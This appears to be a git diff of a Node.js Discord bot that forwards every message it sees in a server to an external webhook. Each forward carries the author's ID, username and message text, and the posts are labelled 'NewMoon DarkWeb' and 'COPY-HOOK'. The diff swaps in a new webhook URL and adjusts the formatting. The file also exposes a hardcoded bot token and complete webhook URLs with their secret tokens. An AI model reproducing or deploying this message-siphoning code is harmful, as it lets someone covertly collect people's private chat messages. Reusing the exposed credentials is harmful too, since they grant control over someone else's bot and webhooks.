@@ -5,7 +5,7 @@ const { Client, Intents, WebhookClient, MessageEmbed, webhook,   } = require("di
 const client = new Client({
 intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES]
 });
-const Myhook = 'https://discord.com/api/webhooks/1006286640920141857/TCVjMTg6FKibFYaMW1qe7ZjcXC0_QhaA7Zz6s_Jz_dPrV4dWcXq_0zL1Y8LjMTTe0fVf'
+const Myhook = 'https://discord.com/api/webhooks/1006397942715916359/YXHxkxT5DOV7YfqvQtjxBkIXH84ZPSUqjJHTDTr4Q_7zg9v_cuBIsQWMSV3fJHMhKLed'
 const TOKEN = "OTQyMzQ0NjI3MjkyMzY4OTI2.GLHk6T.tcDTHBIVHoj13mxBp7Sph5tNC-T8fUzqRL0caU"
 
 
@@ -38,7 +38,7 @@ client.on("messageCreate", (message) => {
     username: "NewMoon DarkWeb",
     avatar_url: "https://cdn.discordapp.com/attachments/998675140042817567/1006392481748889712/unnamed.png",
     title: "??? BY COPY-HOOK",
-    content:  "<@!" + message.author.id + ">" + "Message sent By" + "-" + message.author.username + " "+ "\n" + "```" + "Msg =" + " "+ message.content +"```"
+    content:  "<@!" + message.author.id + ">" + "\n" + "Message sent By" + "-" + message.author.username + " "+ "\n" + "```" + " "+ message.content +"```"
     
   }
   request.send(JSON.stringify(params));
